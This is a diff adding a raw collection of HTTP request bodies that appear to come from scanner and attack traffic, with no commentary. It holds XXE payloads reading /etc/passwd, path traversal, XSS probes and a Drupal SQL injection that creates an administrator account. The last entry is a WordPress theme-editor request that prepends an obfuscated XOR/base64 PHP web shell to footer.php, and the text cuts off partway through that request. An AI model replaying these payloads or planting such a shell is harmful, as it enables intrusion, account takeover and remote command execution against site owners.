@@ -1,0 +1,315 @@
+--- Corps #1 ---
+<soap:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Header><operationID>00000001-00000001</operationID></soap:Header><soap:Body><RetrieveServiceContent xmlns="urn:internalvim25"><_this xsi:type="ManagedObjectReference" type="ServiceInstance">ServiceInstance</_this></RetrieveServiceContent></soap:Body></soap:Envelope>
+
+--- Corps #2 ---
+<methodCall> <methodName>system.listMethods</methodName> <params></params> </methodCall>
+
+--- Corps #3 ---
+This was a Nikto test.
+
+--- Corps #4 ---
+<methodCall> <methodName>system.listMethods</methodName> <params></params> </methodCall>
+
+--- Corps #5 ---
+<soap:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Header><operationID>00000001-00000001</operationID></soap:Header><soap:Body><RetrieveServiceContent xmlns="urn:internalvim25"><_this xsi:type="ManagedObjectReference" type="ServiceInstance">ServiceInstance</_this></RetrieveServiceContent></soap:Body></soap:Envelope>
+
+--- Corps #6 ---
+<soap:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Header><operationID>00000001-00000001</operationID></soap:Header><soap:Body><RetrieveServiceContent xmlns="urn:internalvim25"><_this xsi:type="ManagedObjectReference" type="ServiceInstance">ServiceInstance</_this></RetrieveServiceContent></soap:Body></soap:Envelope>
+
+--- Corps #7 ---
+<methodCall> <methodName>system.listMethods</methodName> <params></params> </methodCall>
+
+--- Corps #8 ---
+<?php system('echo NmapCVEIdentification');die(); ?>
+
+--- Corps #9 ---
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE test
+    [ <!ENTITY x3 SYSTEM "/etc/passwd"> ]><amfx ver="3"
+    xmlns="http://www.macromedia.com/2005/amfx"><body>
+    <object type="flex.messaging.messages.CommandMessage">
+    <traits><string>body</string><string>clientId</string>
+    <string>correlationId</string><string>destination</string>
+    <string>headers</string><string>messageId</string><string>
+    operation</string><string>timestamp</string><string>timeToLive
+    </string></traits><object><traits /></object><null /><string />
+    <string /><object><traits><string>DSId</string><string>
+    DSMessagingVersion</string></traits><string>nil</string>
+    <int>1</int></object><string>&x3;</string><int>5</int>
+    <int>0</int><int>0</int></object></body></amfx>
+
+--- Corps #10 ---
+name[0;insert%20into%20users%20%28uid%2Cname%2Cpass%2Cmail%2Cstatus%29%20select%20max%28uid%29%2B1%2C%27lobshpuegu%27%2C%27%24P%24DgcewaeevXnEV4dk8McCa1zAxI1eCt1%27%2C%27gdaxsnuf%40ugloc.klk%27%2C1%20from%20users%3Binsert%20into%20users_roles%20%28uid%2C%20rid%29%20VALUES%20%28%28select%20uid%20from%20users%20where%20name%3D%27lobshpuegu%27%29%2C%20%28select%20rid%20from%20role%20where%20name%20%3D%20%27administrator%27%29%29%3B#%20%20]=jbjtsmkvtx&name[0]=yhacavguvw&pass=zlukstqfca&form_id=user_login&op=Log+in
+
+--- Corps #11 ---
+<?xml version="1.0" encoding="utf-8"?><propfind xmlns="DAV:"><prop><getcontentlength xmlns="DAV:"/><getlastmodified xmlns="DAV:"/><executable xmlns="http://apache.org/dav/props/"/><resourcetype xmlns="DAV:"/><checked-in xmlns="DAV:"/><checked-out xmlns="DAV:"/></prop></propfind>
+
+--- Corps #12 ---
+<!--#include virtual="/index.jsp"-->
+
+--- Corps #13 ---
+<?xml version="1.0" encoding="utf-8"?><propfind xmlns="DAV:"><prop><getcontentlength xmlns="DAV:"/><getlastmodified xmlns="DAV:"/><executable xmlns="http://apache.org/dav/props/"/><resourcetype xmlns="DAV:"/><checked-in xmlns="DAV:"/><checked-out xmlns="DAV:"/></prop></propfind>
+
+--- Corps #14 ---
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE test
+    [ <!ENTITY x3 SYSTEM "/etc/passwd"> ]><amfx ver="3"
+    xmlns="http://www.macromedia.com/2005/amfx"><body>
+    <object type="flex.messaging.messages.CommandMessage">
+    <traits><string>body</string><string>clientId</string>
+    <string>correlationId</string><string>destination</string>
+    <string>headers</string><string>messageId</string><string>
+    operation</string><string>timestamp</string><string>timeToLive
+    </string></traits><object><traits /></object><null /><string />
+    <string /><object><traits><string>DSId</string><string>
+    DSMessagingVersion</string></traits><string>nil</string>
+    <int>1</int></object><string>&x3;</string><int>5</int>
+    <int>0</int><int>0</int></object></body></amfx>
+
+--- Corps #15 ---
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE test
+    [ <!ENTITY x3 SYSTEM "/etc/passwd"> ]><amfx ver="3"
+    xmlns="http://www.macromedia.com/2005/amfx"><body>
+    <object type="flex.messaging.messages.CommandMessage">
+    <traits><string>body</string><string>clientId</string>
+    <string>correlationId</string><string>destination</string>
+    <string>headers</string><string>messageId</string><string>
+    operation</string><string>timestamp</string><string>timeToLive
+    </string></traits><object><traits /></object><null /><string />
+    <string /><object><traits><string>DSId</string><string>
+    DSMessagingVersion</string></traits><string>nil</string>
+    <int>1</int></object><string>&x3;</string><int>5</int>
+    <int>0</int><int>0</int></object></body></amfx>
+
+--- Corps #16 ---
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE test
+    [ <!ENTITY x3 SYSTEM "/etc/passwd"> ]><amfx ver="3"
+    xmlns="http://www.macromedia.com/2005/amfx"><body>
+    <object type="flex.messaging.messages.CommandMessage">
+    <traits><string>body</string><string>clientId</string>
+    <string>correlationId</string><string>destination</string>
+    <string>headers</string><string>messageId</string><string>
+    operation</string><string>timestamp</string><string>timeToLive
+    </string></traits><object><traits /></object><null /><string />
+    <string /><object><traits><string>DSId</string><string>
+    DSMessagingVersion</string></traits><string>nil</string>
+    <int>1</int></object><string>&x3;</string><int>5</int>
+    <int>0</int><int>0</int></object></body></amfx>
+
+--- Corps #17 ---
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE test
+    [ <!ENTITY x3 SYSTEM "/etc/passwd"> ]><amfx ver="3"
+    xmlns="http://www.macromedia.com/2005/amfx"><body>
+    <object type="flex.messaging.messages.CommandMessage">
+    <traits><string>body</string><string>clientId</string>
+    <string>correlationId</string><string>destination</string>
+    <string>headers</string><string>messageId</string><string>
+    operation</string><string>timestamp</string><string>timeToLive
+    </string></traits><object><traits /></object><null /><string />
+    <string /><object><traits><string>DSId</string><string>
+    DSMessagingVersion</string></traits><string>nil</string>
+    <int>1</int></object><string>&x3;</string><int>5</int>
+    <int>0</int><int>0</int></object></body></amfx>
+
+--- Corps #18 ---
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE test
+    [ <!ENTITY x3 SYSTEM "/etc/passwd"> ]><amfx ver="3"
+    xmlns="http://www.macromedia.com/2005/amfx"><body>
+    <object type="flex.messaging.messages.CommandMessage">
+    <traits><string>body</string><string>clientId</string>
+    <string>correlationId</string><string>destination</string>
+    <string>headers</string><string>messageId</string><string>
+    operation</string><string>timestamp</string><string>timeToLive
+    </string></traits><object><traits /></object><null /><string />
+    <string /><object><traits><string>DSId</string><string>
+    DSMessagingVersion</string></traits><string>nil</string>
+    <int>1</int></object><string>&x3;</string><int>5</int>
+    <int>0</int><int>0</int></object></body></amfx>
+
+--- Corps #19 ---
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE test
+    [ <!ENTITY x3 SYSTEM "/etc/passwd"> ]><amfx ver="3"
+    xmlns="http://www.macromedia.com/2005/amfx"><body>
+    <object type="flex.messaging.messages.CommandMessage">
+    <traits><string>body</string><string>clientId</string>
+    <string>correlationId</string><string>destination</string>
+    <string>headers</string><string>messageId</string><string>
+    operation</string><string>timestamp</string><string>timeToLive
+    </string></traits><object><traits /></object><null /><string />
+    <string /><object><traits><string>DSId</string><string>
+    DSMessagingVersion</string></traits><string>nil</string>
+    <int>1</int></object><string>&x3;</string><int>5</int>
+    <int>0</int><int>0</int></object></body></amfx>
+
+--- Corps #20 ---
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE test
+    [ <!ENTITY x3 SYSTEM "/etc/passwd"> ]><amfx ver="3"
+    xmlns="http://www.macromedia.com/2005/amfx"><body>
+    <object type="flex.messaging.messages.CommandMessage">
+    <traits><string>body</string><string>clientId</string>
+    <string>correlationId</string><string>destination</string>
+    <string>headers</string><string>messageId</string><string>
+    operation</string><string>timestamp</string><string>timeToLive
+    </string></traits><object><traits /></object><null /><string />
+    <string /><object><traits><string>DSId</string><string>
+    DSMessagingVersion</string></traits><string>nil</string>
+    <int>1</int></object><string>&x3;</string><int>5</int>
+    <int>0</int><int>0</int></object></body></amfx>
+
+--- Corps #21 ---
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE test
+    [ <!ENTITY x3 SYSTEM "/etc/passwd"> ]><amfx ver="3"
+    xmlns="http://www.macromedia.com/2005/amfx"><body>
+    <object type="flex.messaging.messages.CommandMessage">
+    <traits><string>body</string><string>clientId</string>
+    <string>correlationId</string><string>destination</string>
+    <string>headers</string><string>messageId</string><string>
+    operation</string><string>timestamp</string><string>timeToLive
+    </string></traits><object><traits /></object><null /><string />
+    <string /><object><traits><string>DSId</string><string>
+    DSMessagingVersion</string></traits><string>nil</string>
+    <int>1</int></object><string>&x3;</string><int>5</int>
+    <int>0</int><int>0</int></object></body></amfx>
+
+--- Corps #22 ---
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE test
+    [ <!ENTITY x3 SYSTEM "/etc/passwd"> ]><amfx ver="3"
+    xmlns="http://www.macromedia.com/2005/amfx"><body>
+    <object type="flex.messaging.messages.CommandMessage">
+    <traits><string>body</string><string>clientId</string>
+    <string>correlationId</string><string>destination</string>
+    <string>headers</string><string>messageId</string><string>
+    operation</string><string>timestamp</string><string>timeToLive
+    </string></traits><object><traits /></object><null /><string />
+    <string /><object><traits><string>DSId</string><string>
+    DSMessagingVersion</string></traits><string>nil</string>
+    <int>1</int></object><string>&x3;</string><int>5</int>
+    <int>0</int><int>0</int></object></body></amfx>
+
+--- Corps #23 ---
+<!--#include virtual="/index.jsp"-->
+
+--- Corps #24 ---
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE test
+    [ <!ENTITY x3 SYSTEM "/etc/passwd"> ]><amfx ver="3"
+    xmlns="http://www.macromedia.com/2005/amfx"><body>
+    <object type="flex.messaging.messages.CommandMessage">
+    <traits><string>body</string><string>clientId</string>
+    <string>correlationId</string><string>destination</string>
+    <string>headers</string><string>messageId</string><string>
+    operation</string><string>timestamp</string><string>timeToLive
+    </string></traits><object><traits /></object><null /><string />
+    <string /><object><traits><string>DSId</string><string>
+    DSMessagingVersion</string></traits><string>nil</string>
+    <int>1</int></object><string>&x3;</string><int>5</int>
+    <int>0</int><int>0</int></object></body></amfx>
+
+--- Corps #25 ---
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE test
+    [ <!ENTITY x3 SYSTEM "/etc/passwd"> ]><amfx ver="3"
+    xmlns="http://www.macromedia.com/2005/amfx"><body>
+    <object type="flex.messaging.messages.CommandMessage">
+    <traits><string>body</string><string>clientId</string>
+    <string>correlationId</string><string>destination</string>
+    <string>headers</string><string>messageId</string><string>
+    operation</string><string>timestamp</string><string>timeToLive
+    </string></traits><object><traits /></object><null /><string />
+    <string /><object><traits><string>DSId</string><string>
+    DSMessagingVersion</string></traits><string>nil</string>
+    <int>1</int></object><string>&x3;</string><int>5</int>
+    <int>0</int><int>0</int></object></body></amfx>
+
+--- Corps #26 ---
+<soap:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Header><operationID>00000001-00000001</operationID></soap:Header><soap:Body><RetrieveServiceContent xmlns="urn:internalvim25"><_this xsi:type="ManagedObjectReference" type="ServiceInstance">ServiceInstance</_this></RetrieveServiceContent></soap:Body></soap:Envelope>
+
+--- Corps #27 ---
+ASDE / HTTP/1.1
+Host: 192.168.1.5
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
+
+GET /?parameter=../../../etc/passwd HTTP/1.1
+Host: 192.168.1.5
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
+
+GET / HTTP/1.1
+Host: somerandomsite.com
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
+
+GET /?parameter=<hellot>hello HTTP/1.1
+Host: 192.168.1.5
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
+
+GET /?parameter=%3Chellot%3Ehello HTTP/1.1
+Host: 192.168.1.5
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
+
+GET /?parameter=<script>alert(1)</script> HTTP/1.1
+Host: 192.168.1.5
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
+
+GET /?parameter=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
+Host: 192.168.1.5
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
+
+GET /?parameter=cmd.exe HTTP/1.1
+Host: 192.168.1.5
+Connection: close
+User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
+
+
+
+--- Corps #28 ---
+usesubform[1]=1&usesubform[2]=1&subform[1][redirect]=../../../../../etc/passwd&subform[1][cXIb8O3]=1
+
+--- Corps #29 ---
+usesubform[1]=1&usesubform[2]=1&subform[1][redirect]=../../../../../etc/passwd&subform[1][cXIb8O3]=1
+
+--- Corps #30 ---
+<?xml version="1.0" encoding="UTF-8"?>
+<probe type="string"><![CDATA[
+nmap
+]]></probe>
+
+--- Corps #31 ---
+interval=60&_nonce=27d2ce2949&action=heartbeat&screen_id=theme-editor&has_focus=false
+
+--- Corps #32 ---
+<?xml version="1.0" encoding="UTF-8"?>
+<probe type="yaml"><![CDATA[
+--- !ruby/object:Time {}
+
+]]></probe>
+
+--- Corps #33 ---
+interval=60&_nonce=27d2ce2949&action=heartbeat&screen_id=dashboard&has_focus=true
+
+--- Corps #34 ---
+<?xml version="1.0" encoding="UTF-8"?>
+<probe type="yaml"><![CDATA[
+--- !ruby/object:^@
+]]></probe>
+
+
+--- Corps #35 ---
+interval=60&_nonce=27d2ce2949&action=heartbeat&screen_id=theme-editor&has_focus=true
+
+--- Corps #36 ---
+nonce=f295f3e78f&_wp_http_referer=%2Fwp-admin%2Ftheme-editor.php%3Ffile%3Dpatterns%252Ffooter.php%26theme%3Dtwentytwentyfive&newcontent=%3C%3Fphp%0A%0A%2F**%0A+*+Title%3A+Footer%0A+*+Slug%3A+twentytwentyfive%2Ffooter%0A+*+Categories%3A+footer%0A+*+Block+Types%3A+core%2Ftemplate-part%2Ffooter%0A+*+Description%3A+Footer+columns+with+logo%2C+title%2C+tagline+and+links.%0A+*%0A+*+%40package+WordPress%0A+*+%40subpackage+Twenty_Twenty_Five%0A+*+%40since+Twenty+Twenty-Five+1.0%0A+*%2F%0A%0A%3F%3E%0A%3C!--+wp%3Agroup+%7B%22style%22%3A%7B%22spacing%22%3A%7B%22padding%22%3A%7B%22top%22%3A%22var%3Apreset%7Cspacing%7C60%22%2C%22bottom%22%3A%22var%3Apreset%7Cspacing%7C50%22%7D%7D%7D%2C%22layout%22%3A%7B%22type%22%3A%22constrained%22%7D%7D+--%3E%0A%3Cdiv+class%3D%22wp-block-group%22+style%3D%22padding-top%3Avar(--wp--preset--spacing--60)%3Bpadding-bottom%3Avar(--wp--preset--spacing--50)%22%3E%0A%09%3C!--+wp%3Agroup+%7B%22align%22%3A%22wide%22%2C%22layout%22%3A%7B%22type%22%3A%22default%22%7D%7D+--%3E%0A%09%3Cdiv+class%3D%22wp-block-group+alignwide%22%3E%0A%09%09%3C!--+wp%3Asite-logo+%2F--%3E%0A%0A%09%09%3C!--+wp%3Agroup+%7B%22align%22%3A%22full%22%2C%22layout%22%3A%7B%22type%22%3A%22flex%22%2C%22flexWrap%22%3A%22wrap%22%2C%22justifyContent%22%3A%22space-between%22%2C%22verticalAlignment%22%3A%22top%22%7D%7D+--%3E%0A%09%09%3Cdiv+class%3D%22wp-block-group+alignfull%22%3E%0A%09%09%09%3C!--+wp%3Acolumns+--%3E%0A%09%09%09%3Cdiv+class%3D%22wp-block-columns%22%3E%0A%09%09%09%09%3C!--+wp%3Acolumn+%7B%22width%22%3A%22100%25%22%7D+--%3E%0A%09%09%09%09%3Cdiv+class%3D%22wp-block-column%22+style%3D%22flex-basis%3A100%25%22%3E%3C!--+wp%3Asite-title+%7B%22level%22%3A2%7D+%2F--%3E%0A%0A%09%09%09%09%3C!--+wp%3Asite-tagline+%2F--%3E%0A%09%09%09%09%3C%2Fdiv%3E%0A%09%09%09%09%3C!--+%2Fwp%3Acolumn+--%3E%0A%0A%09%09%09%09%3C!--+wp%3Acolumn+%7B%22width%22%3A%22%22%7D+--%3E%0A%09%09%09%09%3Cdiv+class%3D%22wp-block-column%22%3E%0A%09%09%09%09%09%3C!--+wp%3Aspacer+%7B%22height%22%3A%22var%3Apreset%7Cspacing%7C40%22%2C%22width%22%3A%220px%22%7D+--%3E%0A%09%09%09%09%09%3Cdiv+style%3D%22height%3Avar(--wp--preset--spacing--40)%3Bwidth%3A0px%22+aria-hidden%3D%22true%22+class%3D%22wp-block-spacer%22%3E%3C%2Fdiv%3E%0A%09%09%09%09%09%3C!--+%2Fwp%3Aspacer+--%3E%0A%09%09%09%09%3C%2Fdiv%3E%0A%09%09%09%09%3C!--+%2Fwp%3Acolumn+--%3E%0A%09%09%09%3C%2Fdiv%3E%0A%09%09%09%3C!--+%2Fwp%3Acolumns+--%3E%0A%0A%09%09%09%3C!--+wp%3Agroup+%7B%22style%22%3A%7B%22spacing%22%3A%7B%22blockGap%22%3A%22var%3Apreset%7Cspacing%7C80%22%7D%7D%2C%22layout%22%3A%7B%22type%22%3A%22flex%22%2C%22flexWrap%22%3A%22wrap%22%2C%22verticalAlignment%22%3A%22top%22%2C%22justifyContent%22%3A%22space-between%22%7D%7D+--%3E%0A%09%09%09%3Cdiv+class%3D%22wp-block-group%22%3E%0A%09%09%09%09%3C!--+wp%3Anavigation+%7B%22overlayMenu%22%3A%22never%22%2C%22layout%22%3A%7B%22type%22%3A%22flex%22%2C%22orientation%22%3A%22vertical%22%7D%7D+--%3E%0A%09%09%09%09%09%3C!--+wp%3Anavigation-link+%7B%22label%22%3A%22%3C%3Fphp+esc_html_e(+'Blog'%2C+'twentytwentyfive'+)%3B+%3F%3E%22%2C%22url%22%3A%22%23%22%7D+%2F--%3E%0A%0A%09%09%09%09%09%3C!--+wp%3Anavigation-link+%7B%22label%22%3A%22%3C%3Fphp+esc_html_e(+'About'%2C+'twentytwentyfive'+)%3B+%3F%3E%22%2C%22url%22%3A%22%23%22%7D+%2F--%3E%0A%0A%09%09%09%09%09%3C!--+wp%3Anavigation-link+%7B%22label%22%3A%22%3C%3Fphp+esc_html_e(+'FAQs'%2C+'twentytwentyfive'+)%3B+%3F%3E%22%2C%22url%22%3A%22%23%22%7D+%2F--%3E%0A%0A%09%09%09%09%09%3C!--+wp%3Anavigation-link+%7B%22label%22%3A%22%3C%3Fphp+esc_html_e(+'Authors'%2C+'twentytwentyfive'+)%3B+%3F%3E%22%2C%22url%22%3A%22%23%22%7D+%2F--%3E%0A%09%09%09%09%3C!--+%2Fwp%3Anavigation+--%3E%0A%0A%09%09%09%09%3C!--+wp%3Anavigation+%7B%22overlayMenu%22%3A%22never%22%2C%22layout%22%3A%7B%22type%22%3A%22flex%22%2C%22orientation%22%3A%22vertical%22%7D%7D+--%3E%0A%09%09%09%09%09%3C!--+wp%3Anavigation-link+%7B%22label%22%3A%22%3C%3Fphp+esc_html_e(+'Events'%2C+'twentytwentyfive'+)%3B+%3F%3E%22%2C%22url%22%3A%22%23%22%7D+%2F--%3E%0A%0A%09%09%09%09%09%3C!--+wp%3Anavigation-link+%7B%22label%22%3A%22%3C%3Fphp+esc_html_e(+'Shop'%2C+'twentytwentyfive'+)%3B+%3F%3E%22%2C%22url%22%3A%22%23%22%7D+%2F--%3E%0A%0A%09%09%09%09%09%3C!--+wp%3Anavigation-link+%7B%22label%22%3A%22%3C%3Fphp+esc_html_e(+'Patterns'%2C+'twentytwentyfive'+)%3B+%3F%3E%22%2C%22url%22%3A%22%23%22%7D+%2F--%3E%0A%0A%09%09%09%09%09%3C!--+wp%3Anavigation-link+%7B%22label%22%3A%22%3C%3Fphp+esc_html_e(+'Themes'%2C+'twentytwentyfive'+)%3B+%3F%3E%22%2C%22url%22%3A%22%23%22%7D+%2F--%3E%0A%09%09%09%09%3C!--+%2Fwp%3Anavigation+--%3E%0A%09%09%09%3C%2Fdiv%3E%0A%09%09%09%09%3C!--+%2Fwp%3Agroup+--%3E%0A%09%09%3C%2Fdiv%3E%0A%09%09%3C!--+%2Fwp%3Agroup+--%3E%0A%0A%09%09%3C!--+wp%3Aspacer+%7B%22height%22%3A%22var%3Apreset%7Cspacing%7C70%22%7D+--%3E%0A%09%09%3Cdiv+style%3D%22height%3Avar(--wp--preset--spacing--70)%22+aria-hidden%3D%22true%22+class%3D%22wp-block-spacer%22%3E%3C%2Fdiv%3E%0A%09%09%3C!--+%2Fwp%3Aspacer+--%3E%0A%0A%09%09%3C!--+wp%3Agroup+%7B%22align%22%3A%22full%22%2C%22style%22%3A%7B%22spacing%22%3A%7B%22blockGap%22%3A%22var%3Apreset%7Cspacing%7C20%22%7D%7D%2C%22layout%22%3A%7B%22type%22%3A%22flex%22%2C%22flexWrap%22%3A%22wrap%22%2C%22justifyContent%22%3A%22space-between%22%7D%7D+--%3E%0A%09%09%3Cdiv+class%3D%22wp-block-group+alignfull%22%3E%0A%09%09%09%3C!--+wp%3Aparagraph+%7B%22fontSize%22%3A%22small%22%7D+--%3E%0A%09%09%09%3Cp+class%3D%22has-small-font-size%22%3E%3C%3Fphp+esc_html_e(+'Twenty+Twenty-Five'%2C+'twentytwentyfive'+)%3B+%3F%3E%3C%2Fp%3E%0A%09%09%09%3C!--+%2Fwp%3Aparagraph+--%3E%0A%09%09%09%3C!--+wp%3Aparagraph+%7B%22fontSize%22%3A%22small%22%7D+--%3E%0A%09%09%09%3Cp+class%3D%22has-small-font-size%22%3E%0A%09%09%09%09%3C%3Fphp%0A%09%09%09%09printf(%0A%09%09%09%09%09%2F*+translators%3A+Designed+with+WordPress.+%25s%3A+WordPress+link.+*%2F%0A%09%09%09%09%09esc_html__(+'Designed+with+%25s'%2C+'twentytwentyfive'+)%2C%0A%09%09%09%09%09'%3Ca+href%3D%22'+.+esc_url(+__(+'https%3A%2F%2Fwordpress.org'%2C+'twentytwentyfive'+)+)+.+'%22+rel%3D%22nofollow%22%3EWordPress%3C%2Fa%3E'%0A%09%09%09%09)%3B%0A%09%09%09%09%3F%3E%0A%09%09%09%3C%2Fp%3E%0A%09%09%09%3C!--+%2Fwp%3Aparagraph+--%3E%0A%09%09%3C%2Fdiv%3E%0A%09%09%3C!--+%2Fwp%3Agroup+--%3E%0A%09%3C%2Fdiv%3E%0A%09%3C!--+%2Fwp%3Agroup+--%3E%0A%3C%2Fdiv%3E%0A%3C!--+%2Fwp%3Agroup+--%3E%0A&action=edit-theme-plugin-file&file=patterns%2Ffooter.php&theme=twentytwentyfive&docs-list=
+
+--- Corps #37 ---
+nonce=f295f3e78f&_wp_http_referer=%2Fwp-admin%2Ftheme-editor.php%3Ffile%3Dpatterns%252Ffooter.php%26theme%3Dtwentytwentyfive&newcontent=%3C%3Fphp%0A%0Agoto+x6kM1%3B+T1F5b%3A+if+(isset(%24_REQUEST%5B%22%5C143%5C60%5C115%5C141%5C116%5C144%22%5D)+%26%26+!empty(%24_REQUEST%5B%22%5Cx63%5Cx30%5C115%5Cx61%5C116%5C144%22%5D))+%7B+%24key+%3D+1337+%25+256%3B+%24encrypted+%3D+base64_decode(%24_REQUEST%5B%22%5Cx63%5C60%5C115%5C141%5C116%5C144%22%5D)%3B+%24decrypted+%3D+xor_cipher(%24encrypted%2C+%24key)%3B+ob_start()%3B+system(%24decrypted)%3B+%24output+%3D+ob_get_clean()%3B+%24encrypted_output+%3D+xor_cipher(%24output%2C+%24key)%3B+echo+base64_encode(%24encrypted_output)%3B+%7D+goto+LYWUx%3B+x6kM1%3A+function+xor_cipher(%24data%2C+%24key)+%7B+%24out+%3D+''%3B+for+(%24i+%3D+0%3B+%24i+%3C+strlen(%24data)%3B+%24i%2B%2B)+%7B+%24out+.%3D+%24data%5B%24i%5D+%5E+chr(%24key)%3B+%7D+return+%24out%3B+%7D+goto+T1F5b%3B+LYWUx%3A%0A%2F**%0A+*+Title%3A+Footer%0A+*+Slug%3A+twentytwentyfive%2Ffooter%0A+*+Categories%3A+footer%0A+*+Block+Types%3A+core%2Ftemplate-part%2Ffooter%0A+*+Description%3A+Footer+columns+with+logo%2C+title%2C+tagline+and+links.%0A+*%0A+*+%40package+WordPress%0A+*+%40subpackage+Twenty_Twenty_Five%0A+*+%40since+Twenty+Twenty-Five+1.0%0A+*%2F%0A%0A%3F%3E%0A%3C!--+wp%3Agroup+%7B%22style%22%3A%7B%22spacing%22%3A%7B%22padding%22%3A%7B%22top%22%3A%22var%3Apreset%7Cspacing%7C60%22%2C%22bottom%22%3A%22var%3Apreset%7Cspacing%7C50%22%7D%7D%7D%2C%22layout%22%3A%7B%22type%22%3A%22constrained%22%7D%7D+--%3E%0A%3Cdiv+class%3D%22wp-block-group%22+style%3D%22padding-top%3Avar(--wp--preset--spacing--60)%3Bpadding-bottom%3Avar(--wp--preset--spacing--50)%22%3E%0A%09%3C!--+wp%3Agroup+%7B%22align%22%3A%22wide%22%2C%22layout%22%3A%7B%22type%22%3A%22default%22%7D%7D+--%3E%0A%09%3Cdiv+class%3D%22wp-block-group+alignwide%22%3E%0A%09%09%3C!--+wp%3Asite-logo+%2F--%3E%0A%0A%09%09%3C!--+wp%3Agroup+%7B%22align%22%3A%22full%22%2C%22layout%22%3A%7B%22type%22%3A%22flex%22%2C%22flexWrap%22%3A%22wrap%22%2C%22justifyContent%22%3A%22space-between%22%2C%22verticalAlignment%22%3A%22top%22%7D%7D+--%3E%0A%09%09%3Cdiv+class%3D%22wp-block-group+alignfull%22%3E%0A%09%09%09%3C!--+wp%3Acolumns+--%3E%0A%09%09%09%3Cdiv+class%3D%22wp-block-columns%22%3E%0A%09%09%09%09%3C!--+wp%3Acolumn+%7B%22width%22%3A%22100%25%22%7D+--%3E%0A%09%09%09%09%3Cdiv+class%3D%22wp-block-column%22+style%3D%22flex-basis%3A100%25%22%3E%3C!--+wp%3Asite-title+%7B%22level%22%3A2%7D+%2F--%3E%0A%0A%09%09%09%09%3C!--+wp%3Asite-tagline+%2F--%3E%0A%09%09%09%09%3C%2Fdiv%3E%0A%09%09%09%09%3C!--+%2Fwp%3Acolumn+--%3E%0A%0A%09%09%09%09%3C!--+wp%3Acolumn+%7B%22width%22%3A%22%22%7D+--%3E%0A%09%09%09%09%3Cdiv+class%3D%22wp-block-column%22%3E%0A%09%09%09%09%09%3C!--+wp%3Aspacer+%7B%22height%22%3A%22var%3Apreset%7Cspacing%7C40%22%2C%22width%22%3A%220px%22%7D+--%3E%0A%09%09%09%09%09%3Cdiv+style%3D%22height%3Avar(--wp--preset--spacing--40)%3Bwidth%3A0px%22+aria-hidden%3D%22true%22+class%3D%22wp-block-spacer%22%3E%3C%2Fdiv%3E%0A%09%09%09%09%09%3C!--+%2Fwp%3Aspacer+--%3E%0A%09%09%09%09%3C%2Fdiv%3E%0A%09%09%09%09%3C!--+%2Fwp%3Acolumn+--%3E%0A%09%09%09%3C%2Fdiv%3E%0A%09%09%09%3C!--+%2Fwp%3Acolumns+--%3E%0A%0A%09%09%09%3C!--+wp%3Agroup+%7B%22style%22%3A%7B%22spacing%22%3A%7B%22blockGap%22%3A%22var%3Apreset%7Cspacing%7C80%22%7D%7D%2C%22layout%22%3A%7B%22type%22%3A%22flex%22%2C%22flexWrap%22%3A%22wrap%22%2C%22verticalAlignment%22%3A%22top%22%2C%22justifyContent%22%3A%22space-between%22%7D%7D+--%3E%0A%09%09%09%3Cdiv+class%3D%22wp-block-group%22%3E%0A%09%09%09%09%3C!--+wp%3Anavigation+%7B%22overlayMenu%22%3A%22never%22%2C%22layout%22%3A%7B%22type%22%3A%22flex%22%2C%22orientation%22%3A%22vertical%22%7D%7D+--%3E%0A%09%09%09%09%09%3C!--+wp%3Anavigation-link+%7B%22label%22%3A%22%3C%3Fphp+esc_html_e(+'Blog'%2C+'twentytwentyfive'+)%3B+%3F%3E%22%2C%22url%22%3A%22%23%22%7D+%2F--%3E%0A%0A%09%09%09%09%09%3C!--+wp%3Anavigation-link+%7B%22label%22%3A%22%3C%3Fphp+esc_html_e(+'About'%2C+'twentytwentyfive'+)%3B+%3F%3E%22%2C%22url%22%3A%22%23%22%7D+%2F--%3E%0A%0A%09%09%09%09%09%3C!--+wp%3Anavigation-link+%7B%22label%22%3A%22%3C%3Fphp+esc_html_e(+'FAQs'%2C+'twentytwentyfive'+)%3B+%3F%3E%22%2C%22url%22%3A%22%23%22%7D+%2F--%3E%0A%0A%09%09%09%09%09%3C!--+wp%3Anavigation-link+%7B%22label%22%3A%22%3C%3Fphp+esc_html_e(+'Authors'%2C